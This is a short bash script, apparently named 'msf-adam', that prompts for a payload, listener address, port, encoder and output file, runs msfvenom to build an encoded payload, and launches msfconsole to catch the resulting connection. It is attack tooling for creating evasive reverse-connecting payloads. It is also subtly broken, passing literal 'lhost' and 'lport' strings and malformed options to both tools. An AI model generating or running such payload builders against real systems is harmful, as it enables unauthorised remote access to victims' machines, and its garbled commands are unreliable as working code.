#!/bin/bash
function a {

figlet msf-adam
sleep 1
echo "wait a few seconds .."
sleep 1
read -p "Enter Type payload ...:# " pay
read -p "Enter LOHST ...:# " lhost
read -p "Enter LPORT ...:# " lport
read -p "Enter Format file  ...:# " format
read -p "Enter Out file ...:# " out
read -p "Enter Type encoder ...:# " enco
read -p "Enter Number of encoding ...:# " number
xterm -e "msfvenom -p $pay LHOST=lhost LPORT=lport -f $format -e $enco -t$number -o $out"

}
a
function b {
  #statements
msfconsole -q -x handler -p $pay -H $lhost -P $lport

}
b
